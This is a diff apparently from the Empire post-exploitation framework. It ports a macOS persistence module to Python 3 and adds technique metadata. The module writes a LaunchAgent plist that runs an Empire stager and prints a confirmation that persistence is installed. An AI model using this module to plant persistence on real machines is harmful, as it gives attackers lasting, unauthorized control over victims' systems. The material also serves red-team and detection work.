@@ -1,5 +1,7 @@
-import base64
-class Module:
+from builtins import object
+
+
+class Module(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -13,6 +15,10 @@ class Module:
 
             # more verbose multi-line description of the module
             'Description': ('Installs an Empire launchAgent.'),
+
+            'Software': '',
+
+            'Techniques': ['T1055'],
 
             # True if the module needs to run in the background
             'Background' : False,
@@ -92,7 +98,7 @@ class Module:
         userAgent = self.options['UserAgent']['Value']
         safeChecks = self.options['SafeChecks']['Value']
         launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='python', userAgent=userAgent, safeChecks=safeChecks)
-        launcher = launcher.strip('echo').strip(' | /usr/bin/python &').strip("\"")
+        launcher = launcher.strip('echo').strip(' | python3 &').strip("\"")
 
 
         plistSettings = """<?xml version="1.0" encoding="UTF-8"?>
@@ -140,7 +146,7 @@ e.close()
 os.chmod(plistPath, 0644)
 
 
-print "\\n[+] Persistence has been installed: /Library/LaunchAgents/%s"
+print("\\n[+] Persistence has been installed: /Library/LaunchAgents/%s")
 
 """ % (PLISTName,plistSettings,PLISTName)
 
